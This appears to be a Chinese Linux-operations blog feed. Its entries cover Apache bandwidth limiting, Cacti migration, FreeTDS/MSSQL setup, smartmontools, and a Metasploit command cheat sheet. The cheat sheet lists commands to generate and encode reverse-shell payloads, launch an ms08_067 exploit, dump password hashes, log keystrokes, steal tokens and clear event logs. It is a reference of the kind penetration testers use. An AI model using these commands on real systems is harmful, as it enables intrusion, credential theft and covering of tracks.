<h4 id="选项说明"><a href="#选项说明" class="headerlink" title="选项说明"></a>选项说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">BandWidthDataDir</div><div class="line">格式： BandWidthDataDir</div><div class="line">默认： &quot;/tmp/apachebw&quot;</div><div class="line">上下文： server config</div><div class="line">设置 mod_bandwidth 保存运行时数据的目录。需要在该目录下创建 ./master</div><div class="line">和 ./link 两个子目录，并设置为权限为 777。</div><div class="line">注意：有些系统会定时清理 /tmp 目录，所以在这些系统上最好把</div><div class="line">BandWidthDataDir 设置到其他地方。</div><div class="line">..............................</div><div class="line">BandWidthModule</div><div class="line">格式： BandWidthModule</div><div class="line">默认： Off</div><div class="line">上下文： per server config</div><div class="line">允许或者禁止模块。</div><div class="line">..............................</div><div class="line">BandWidthPulse</div><div class="line">格式： BandWidthPulse</div><div class="line">默认： 1000</div><div class="line">上下文： per server config</div><div class="line">改变计算带宽的时间间隔，默认为1000毫秒（1秒）。使用更低的间隔可以获得</div><div class="line">更精确的带宽控制，但消耗更多的CPU时间，反之亦然。</div><div class="line">注意：这个选项的详细说明请参考 mod_bandwidth 的文档。</div><div class="line">..............................</div><div class="line">BandWidth</div><div class="line">格式： BandWidth</div><div class="line">默认： 无</div><div class="line">上下文： per directory, .htaccess</div><div class="line">限制这个目录下文件下载的速率。</div><div class="line">domain 指定来自哪个域的连接受到这个设置的影响。</div><div class="line">ip 指定来自哪个ip地址（或者ip段）的连接受到影响。</div><div class="line">all 所有连接都受到影响。</div><div class="line">示例：</div><div class="line"># 来自 dualface.com 的连接不限制下载速度</div><div class="line">BandWidth dualface.com 0</div><div class="line"># 来自 192.168.0.0/16（或者192.168.0） 网段的连接不限制下载速度</div><div class="line">BandWidth 192.168.0.0/16 0</div><div class="line"># 其他连接限制下载速度为每秒1024字节</div><div class="line">BandWidth all 1024</div><div class="line"># 越前面的设置优先权越高</div><div class="line">..............................</div><div class="line">LargeFileLimit</div><div class="line">格式： LargeFileLimit</div><div class="line">默认： 无</div><div class="line">上下文： per directory, .htaccess</div><div class="line">对于超过指定大小的文件，下载时使用的速率。如果速率设置0即不限制速度，</div><div class="line">但下载速度仍然要受到BandWidth设置的影响。如果设置成-1，则完全不受影响。</div><div class="line">通过设置不同的文件大小和速率，可以设置不同大小范围内文件的下载速度。</div><div class="line">示例：</div><div class="line"># 文件尺寸大于等于200千字节的文件，下载速率为每秒3072字节</div><div class="line">LargeFileLimit 200 3072</div><div class="line">LargeFileLimit 1024 2048</div><div class="line">..............................</div><div class="line">MaxConnection</div><div class="line">格式： MaxConnection</div><div class="line">默认： 0 （不限制）</div><div class="line">上下文： per directory, .htaccess</div><div class="line">当超过指定连接数时，拒绝新的连接。</div><div class="line">..............................</div><div class="line">MinBandWidth</div><div class="line">格式： MinBandWidth</div><div class="line">默认： all 256</div><div class="line">上下文： per directory, .htaccess</div><div class="line">设置最小带宽，默认为每秒256字节。根据BandWidth和LargeFileLimit设置的速</div><div class="line">率。mod_bandwidth会计算允许的连接数。例如BandWidth为4096字节，而</div><div class="line">MinBandWidth为1024字节，则最大并发连接数为4。</div><div class="line">注意：这个选项的详细说明请参考 mod_bandwidth 的文档。</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Cacti 监控平台迁移备忘及运行cacti的php相关函数]]></title>
      <url>/2012/11/17/cacti-migrate-notes.html</url>
      <content type="html"><![CDATA[<p>公司用的 Cacti 监控平台已经有些时日了，一直运行很稳定，不过，昨天接到通知要迁移 Cacti 平台到别外的一台新服务器。以初以为直接把 Cacti 的 WEB 文件和数据库同步到新服务器就可以了，在实际操作的过程中发现并不是这样的。</p>
<p>首先配置好新服务器的LNMP环境，并将原来的 Cacti 的WEB文件和 mysql 同步到新的服务器。考虑到服务器的安全因素，我的环境配置脚本默认是把 PHP 的以下函数禁用的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions = system,exec,shell_exec,passthru,popen,dl</div></pre></td></tr></table></figure>
<p>Cacti 在读取数据和画图的时候需要 exec() shell_exec() popen() 等函数，果然没有开启，可能会出现不能出图的情况。</p>
<p>如果新的服务器上的文件目录和之前的不一致，需要在引入 sql 之前编辑修改一下路径。不然有可能出现 Cacti 不能正常调用一些脚本的情况。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vi cacti.sql</div><div class="line">:%s//old/cacti.tcis.me//new/cacti.tcis.me/g</div></pre></td></tr></table></figure>
<p>用vi替换的时候注意一下“/”的转义,然后把被监控的服务器上的设置改一下，把IP改为新的服务器的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">vi /etc/snmp/snmpd.conf</div><div class="line"># First, map the community name &quot;public&quot; into a &quot;security name&quot;</div><div class="line">#       sec.name  source          community</div><div class="line">com2sec notConfigUser  新的cacti监控服务器的IP  public</div><div class="line">/etc/init.d/snmpd restart</div><div class="line">然后向 iptables 添加一条新的记录，让其允许和新的监控服务器通信</div><div class="line"></div><div class="line">iptables -I INPUT -s 新的cacti监控服务器的IP -p udp --dport 161 -j ACCEPT`</div><div class="line"></div><div class="line">最后不要忘记在 crontab 中加定期执行 poller.php</div><div class="line">crontab -e</div><div class="line">*/5 * * * * php /new/cacti.tcis.me/poller.php &gt; /dev/null 2&amp;&gt;1</div></pre></td></tr></table></figure>
<p>这个时候，新的 Cacti 监控就应该可以正常工作了。</p>
<p>如果你之前安装有监控 Nginx  的脚本，不要忘记让 perl 支持 LWP::UserAgent ，否则 Nginx 的监控部分会出不来图。</p>
<p>测试是否已经开启支持：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/new/cacti.tcis.me/get_nginx_clients_status.pl [http://tcis.me/nginx_status](http://tcis.me/nginx_status)</div></pre></td></tr></table></figure>
<p>如提示 no (LWP::UserAgent not found) 就说明了 perl 的确是缺少该组件</p>
<p>两种方法安装支持，第一种编译花的时间比较长，建议使用第二种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#方法一：</div><div class="line">#perl -MCPAN -e shell 一直回车，知道出现cpan&gt;;  提示符开始。</div><div class="line">cpan&gt; install LWP::UserAgent7……………………………………</div><div class="line">……………………………………</div><div class="line">cpan&gt; exit</div><div class="line">#方法二：（用时比较短）</div><div class="line">yum installperl-libwww-perl</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下配置连接mssql环境]]></title>
      <url>/2012/10/19/linux-mssql.html</url>
      <content type="html"><![CDATA[<p>这里我们采用freeTDS程序库，实现linux下访问微软SQL SERVER数据库，php通过mssql.so库文件实现连接mssql</p>
<p><strong>操作步骤如下：</strong></p>
<p><strong>   1.下载freeTDS </strong></p>
<p><a href="http://www.ibiblio.org/pub/Linux/ALPHA/freetds/old/0.63/freetds-0.63.tar.gz" target="_blank" rel="external">http://www.ibiblio.org/pub/Linux/ALPHA/freetds/old/0.63/freetds-0.63.tar.gz</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">tar xf freetds-0.63.tar.gz</div><div class="line">./configure --prefix= --with-tdsver=8.0 --enable-msdblib --enable-dbmfix --with-gnu-ld --enable-shared --enable-static</div><div class="line">make &amp;&amp; make install</div><div class="line">(-prefix为设置FreeTDS的安装目录，--with-tdsver是设置TDS版本，--enable-msdblib为是否允许Microsoft数据库函数库)</div><div class="line">vim  /etc/profile</div><div class="line">中加入export PATH=&quot;$PATH:/usr/local/freetds/bin&quot;</div><div class="line">source /etc/profile  是修改的系统变量生效</div></pre></td></tr></table></figure></p>
<p><strong> 2.将freetds库加入系统库缓存</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo “/usr/local/freetds/lib”&gt;&gt;/etc/ld.so.conf</div><div class="line">ldconfig命令使其生效</div></pre></td></tr></table></figure></p>
<p><strong> 3、配置freetds（可省）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[root@ ~]# cat /usr/local/freetds/etc/freetds.conf</div><div class="line"></div><div class="line">[global]</div><div class="line"># TDS protocol version</div><div class="line">;       tds version = 4.2</div><div class="line"># Whether to write a TDSDUMP file for diagnostic purposes</div><div class="line"># (setting this to /tmp is insecure on a multi-user system)</div><div class="line">;       dump file = /tmp/freetds.log</div><div class="line">;       debug flags = 0xffff</div><div class="line"># Command and connection timeouts</div><div class="line">;       timeout = 10</div><div class="line">;       connect timeout = 10</div><div class="line"># If you get out-of-memory errors, it may mean that your client</div><div class="line"># is trying to allocate a huge buffer for a TEXT field.</div><div class="line"># Try setting &apos;text size&apos; to a more reasonable limit</div><div class="line">text size = 64512</div><div class="line">host = xxx.xxx.xxx.xxx(mssql地址)</div><div class="line"></div><div class="line">port = 1433</div><div class="line">tds version = 8.0</div><div class="line">client charset = UTF-8</div></pre></td></tr></table></figure></p>
<p><strong>4.增加mssql扩展</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cd  /usr/src/lnmp/php-5.3.10/ext/mssql</div><div class="line">/usr/local/bin/phpize</div><div class="line">./configure  --with-php-config=/usr/local/bin/php-config  --with-mssql=/usr/local/freetds</div><div class="line">make &amp;&amp; make install</div><div class="line">ls  /usr/local/php/lib/php/extensions/no-debug-non-zts-20090626/mssql.so</div><div class="line">vim /usr/local/php/etc/php.ini</div><div class="line">extension=mssql.so&gt;</div></pre></td></tr></table></figure></p>
<p><strong> 测试：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$ms = mssql_connect(&apos;192.168.1.111,9201&apos;,&apos;usernanme&apos;,&apos;passwd&apos;,false);</div><div class="line">var_dump($ms);</div><div class="line">?&gt;;</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mssql扩展 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux下硬盘健康的检测smartmontools]]></title>
      <url>/2012/10/12/smartmontools.html</url>
      <content type="html"><![CDATA[<p>1.1 什么是Smartmontools？</p>
<p>Smartmontools是一种硬盘检测工具，通过控制和管理硬盘的SMART（Self Monitoring Analysis and Reporting Technology，自动检测分析及报告技术）技术来实现的，SMART技术可以对硬盘的磁头单元、盘片电机驱动系统、硬盘内部电路以及盘片表面介质材 料等进行监测，当SMART监测并分析出硬盘可能出现问题时会及时向用户报警以避免计算机数据受损失。SMART技术必须在主板支持的前提下才能发生作 用，而且 SMART技术也不能保证能预报所有可能发生的硬盘故障。SMART(SFF-8035i) 是硬盘生产商们建立的一个工业标准，这个标准就是在硬盘上保存一个跟执行情况，可靠程度，读找错误率等属性的表格。所有属性都有一个1byte(大小范围 1-253)的标准化值，还包含另一个1byte的关键阶段值，如果属性表格内某个数据接近小于或达到关键阶段值，表明硬盘工作不正常了。</p>
<p>下载地址：source:<a href="http://www.turbolinux.com.cn/turbo/wiki/doku.php?do=export_xhtml&amp;id=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86:smartmontools" target="_blank" rel="external">http://www.turbolinux.com.cn/turbo/wiki/doku.php?do=export_xhtml&amp;id=%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86:smartmontools</a></p>
<p>2.1 Smartmontools的使用</p>
<p>1、启动监控进程</p>
<p>/etc/init.d/smartd start<br>启动 smartd： [ 确定 ]</p>
<p>2、检查硬盘是否支持SMART 1993年以后出厂的硬盘基本上都支持SMART技术，使用如下命令可以来查看：</p>
<p>smartctl -i /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF INFORMATION SECTION ===<br>Device Model: ST3160212A<br>Serial Number: 5LS2EDKN<br>Firmware Version: 3.AAE<br>User Capacity: 160,041,885,696 bytes<br>Device is: Not in smartctl database [for details use: -P showall]<br>ATA Version is: 7<br>ATA Standard is: Exact ATA specification draft version not indicated<br>Local Time is: Mon Sep 17 02:13:37 2007 CST<br>SMART support is: Available - device has SMART capability.<br>SMART support is: Enabled</p>
<p>在上面的信息可以看到，该硬盘是支持SMART技术，且当前是开启的。如果SMART support is: Disabled表示SMART未启用，执行如下命令，启动SMART：</p>
<p>smartctl –smart=on –offlineauto=on –saveauto=on /dev/hdb</p>
<p>3、检查硬盘健康状态</p>
<p>smartctl -H /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART overall-health self-assessment test result: PASSED</p>
<p>请注意result后边的结果：PASSED，这表示硬盘健康状态良好，如果这里显示Failure，那么最好立刻给服务器更换硬盘。SMART只 能报告磁盘已经不再健康，但是报警后还能继续运行多久是不确定的，通常，SMART报警参数是有预留的，磁盘报警后，不会当场坏掉，一般能坚持一段时间， 有的硬盘SMART报警后还继续跑了好几年，有的硬盘SMART报错后几天就坏了，千万不要存在侥幸心理。执行如下命令可以看到详细的参数：</p>
<p>smartctl -A /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART Attributes Data Structure revision number: 10<br>Vendor Specific SMART Attributes with Thresholds:<br>ID# ATTRIBUTE_NAME FLAG VALUE WORST THRESH TYPE UPDATED WHEN_FAILED RAW_VALUE<br>1 Raw_Read_Error_Rate 0x000f 114 100 006 Pre-fail Always - 81812244<br>3 Spin_Up_Time 0x0003 100 099 000 Pre-fail Always - 0<br>4 Start_Stop_Count 0x0032 100 100 020 Old_age Always - 257<br>5 Reallocated_Sector_Ct 0x0033 100 100 036 Pre-fail Always - 0<br>7 Seek_Error_Rate 0x000f 078 060 030 Pre-fail Always - 64781708<br>9 Power_On_Hours 0x0032 096 096 000 Old_age Always - 4365<br>10 Spin_Retry_Count 0x0013 100 100 097 Pre-fail Always - 0<br>12 Power_Cycle_Count 0x0032 100 100 020 Old_age Always - 276<br>187 Unknown_Attribute 0x0032 100 100 000 Old_age Always - 0<br>189 Unknown_Attribute 0x003a 100 100 000 Old_age Always - 0<br>190 Unknown_Attribute 0x0022 058 053 045 Old_age Always - 773324842<br>194 Temperature_Celsius 0x0022 042 047 000 Old_age Always - 42 (Lifetime Min/Max 0/21)<br>195 Hardware_ECC_Recovered 0x001a 052 048 000 Old_age Always - 1562815<br>197 Current_Pending_Sector 0x0012 100 100 000 Old_age Always - 0<br>198 Offline_Uncorrectable 0x0010 100 100 000 Old_age Offline - 0<br>199 UDMA_CRC_Error_Count 0x003e 200 200 000 Old_age Always - 0<br>200 Multi_Zone_Error_Rate 0x0000 100 253 000 Old_age Offline - 0<br>202 TA_Increase_Count 0x0032 100 253 000 Old_age Always - 0</p>
<p>FLAG是标记，标准数值(VALUE)应当小于或等於关键值(THRESH)。WHEN_FAILED 代表错误信息，上面显示的WHEN_FAILED纵行是空行，说明硬盘没有故障。如果WHEN_FAILED显示数字，表明硬盘磁道可能有比较大的坏道。</p>
<p>4、对硬盘进行检测 手工对硬盘进行测试的方法有以下四种：</p>
<p>smartctl -t short &lt;device&gt; 后台检测硬盘，消耗时间短<br>smartctl -t long &lt;device&gt; 后台检测硬盘，消耗时间长<br>smartctl -C -t short &lt;device&gt; 前台检测硬盘，消耗时间短<br>smartctl -C -t long &lt;device&gt; 前台检测硬盘，消耗时间长</p>
<p>例如，在后台对硬盘进行详细的检查，命令如下：</p>
<p>smartctl -t long /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Execute SMART Extended self-test routine immediately in off-line mode”.<br>Drive command “Execute SMART Extended self-test routine immediately in off-line mode” successful.<br>Testing has begun.<br>Please wait 54 minutes for test to complete.<br>Test will complete after Mon Sep 17 03:53:32 2007</p>
<p>Use smartctl -X to abort test.</p>
<p>上面的信息显示54分钟后将完成检查，同时可以使用 smartctl -X 终止检查。终止硬盘检查命令的使用方法是：</p>
<p>smartctl -X /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Abort SMART off-line mode self-test routine”.<br>Self-testing aborted!</p>
<p>5、查看硬盘日志 使用“smartctl -l logtype &lt;device&gt;”可以查看硬盘的日志，日志又分为多种类型，如selftest、error等等。例如查看硬盘检测的日志，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">smartctl -l selftest /dev/hdb</div><div class="line">smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen</div><div class="line">Home page is http://smartmontools.sourceforge.net/</div><div class="line"></div><div class="line">=== START OF READ SMART DATA SECTION ===</div><div class="line">SMART Self-test log structure revision number 1</div><div class="line">Num Test_Description Status Remaining LifeTime(hours) LBA_of_first_error</div><div class="line"># 1 Extended offline Aborted by host 90% 4365 -</div><div class="line"># 2 Extended offline Completed without error 00% 4247 -</div><div class="line"># 3 Short offline Aborted by host 30% 4246 -</div><div class="line"># 4 Short offline Aborted by host 10% 4246 -</div><div class="line"># 5 Extended offline Completed without error 00% 4229 -</div></pre></td></tr></table></figure></p>
<p>查看硬盘错误日志：</p>
<p>smartctl -l error /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART Error Log Version: 1<br>No Errors Logged</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[metasploit(MSF)终端命令大全]]></title>
      <url>/2012/09/27/metasploit.html</url>
      <content type="html"><![CDATA[<p>show exploits</p>
<p>列出metasploit框架中的所有渗透攻击模块。<br>show payloads</p>
<p>列出metasploit框架中的所有攻击载荷。<br>show auxiliary</p>
<p>列出metasploit框架中的所有辅助攻击载荷。<br>search name</p>
<p>查找metasploit框架中所有的渗透攻击和其他模块。<br>info</p>
<p>展示出制定渗透攻击或模块的相关信息。<br>use name</p>
<p>装载一个渗透攻击或模块。<br>LHOST</p>
<p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。<br>RHOST</p>
<p>远程主机或是目标主机。<br>set function</p>
<p>设置特定的配置参数（EG：设置本地或远程主机参数）。<br>setg function</p>
<p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。<br>show options</p>
<p>列出某个渗透攻击或模块中所有的配置参数。<br>show targets</p>
<p>列出渗透攻击所有支持的目标平台。<br>set target num</p>
<p>指定你所知道的目标的操作系统以及补丁版本类型。<br>set payload name</p>
<p>指定想要使用的攻击载荷。<br>show advanced</p>
<p>列出所有高级配置选项。<br>set autorunscript migrate -f.</p>
<p>在渗透攻击完成后，将自动迁移到另一个进程。<br>check</p>
<p>检测目标是否选定渗透攻击存在相应的安全漏洞。<br>exploit</p>
<p>执行渗透攻击或模块来攻击目标。<br>exploit -j</p>
<p>在计划任务下进行渗透攻击（攻击将在后台进行）。<br>exploit -z</p>
<p>渗透攻击完成后不与回话进行交互。<br>exploit -e encoder</p>
<p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。<br>exploit -h</p>
<p>列出exploit命令的帮助信息。<br>sessions -l</p>
<p>列出可用的交互会话（在处理多个shell时使用）。<br>sessions -l -v</p>
<p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。<br>sessions -s script</p>
<p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。<br>sessions -K</p>
<p>杀死所有活跃的交互会话。<br>sessions -c cmd</p>
<p>在所有活跃的metasploit会话上执行一个命令。<br>sessions -u sessionID</p>
<p>升级一个普通的win32 shell到metasploit shell。<br>db_create name</p>
<p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。<br>db_connect name</p>
<p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。<br>db_namp</p>
<p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。<br>db_autopwn -h</p>
<p>展示出db_autopwn命令的帮助信息。<br>db_autopwn -p -r -e</p>
<p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy</p>
<p>删除当前数据库。<br>db_destroy user：<a href="mailto:passwd@host" target="_blank" rel="external">passwd@host</a>：port/database</p>
<p>使用高级选项来删除数据库。<br><strong><em>metasploit命令</em></strong></p>
<p>help</p>
<p>打开meterpreter使用帮助。<br>run scriptname</p>
<p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。<br>sysinfo</p>
<p>列出受控主机的系统信息。<br>ls</p>
<p>列出目标主机的文件和文件夹信息。<br>use priv</p>
<p>加载特权提升扩展模块，来扩展metasploit库。<br>ps</p>
<p>显示所有运行的进程以及相关联的用户账户。<br>migrate PID</p>
<p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。<br>use incognito</p>
<p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）<br>list_tokens -u</p>
<p>列出目标主机用户的可用令牌。<br>list_tokens -g</p>
<p>列出目标主机用户组的可用令牌。<br>impersonate_token DOMAIN_NAMEUSERNAME</p>
<p>假冒目标主机上的可用令牌。<br>steal_token PID</p>
<p>盗窃给定进程的可用令牌并进行令牌假冒。<br>drop_token</p>
<p>停止假冒当前令牌。<br>getsystem</p>
<p>通过各种攻击向量来提升系统用户权限。<br>execute -f cmd.exe -i</p>
<p>执行cmd.exe命令并进行交互。<br>execute -f cmd.exe -i -t</p>
<p>以所有可用令牌来执行cmd命令并隐藏该进程。<br>rev2self</p>
<p>回到控制目标主机的初始用户账户下。<br>reg command</p>
<p>在目标主机注册表中进行交互，创建，删除，查询等操作。<br>setdesktop number</p>
<p>切换到另一个用户界面（该功能基于那些用户已登录）。<br>screenshot</p>
<p>对目标主机的屏幕进行截图。<br>upload file</p>
<p>向目标主机上传文件。<br>download file</p>
<p>从目标主机下载文件。<br>keyscan_start</p>
<p>针对远程目标主机开启键盘记录功能。<br>keyscan_dump</p>
<p>存储目标主机上捕获的键盘记录。<br>keyscan_stop</p>
<p>停止针对目标主机的键盘记录。<br>getprivs</p>
<p>尽可能多的获取目标主机上的特权。<br>uictl enable keyboard/mouse</p>
<p>接管目标主机的键盘和鼠标。<br>background</p>
<p>将你当前的metasploit shell转为后台执行。<br>hashdump</p>
<p>导出目标主机中的口令哈希值。<br>use sniffer</p>
<p>加载嗅探模式。<br>sniffer_interfaces</p>
<p>列出目标主机所有开放的网络端口。<br>sniffer_dump interfaceID pcapname</p>
<p>在目标主机上启动嗅探。<br>sniffer_start interfaceID packet-buffer</p>
<p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。<br>sniffer_stats interfaceID</p>
<p>获取正在实施嗅探网络接口的统计数据。<br>sniffer_stop interfaceID</p>
<p>停止嗅探。<br>add_user username password -h ip</p>
<p>在远程目标主机上添加一个用户。<br>clearev</p>
<p>清楚目标主机上的日志记录。<br>timestomp</p>
<p>修改文件属性，例如修改文件的创建时间（反取证调查）。<br>reboot</p>
<p>重启目标主机。<br><strong><em>MSFpayload命令</em></strong></p>
<p>msfpayload -h</p>
<p>msfpayload的帮助信息。<br>msfpayload windows/meterpreter/bind_tcp O</p>
<p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。<br><strong><em>msfencode命令</em></strong></p>
<p>mefencode -h</p>
<p>列出msfencode的帮助命令。<br>msfencode -l</p>
<p>列出所有可用的编码器。<br>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
<p>显示编码缓冲区的格式。<br>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
<p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。<br>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
<p>创建一个经过多种编码格式嵌套编码的攻击载荷。<br>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
<p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。<br><strong><em>MSFcli命令</em></strong></p>
<p>msfcli | grep exploit</p>
<p>仅列出渗透攻击模块。<br>msfcli | grep exploit/windows</p>
<p>仅列出与windows相关的渗透攻击模块。<br>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
<p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> msf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
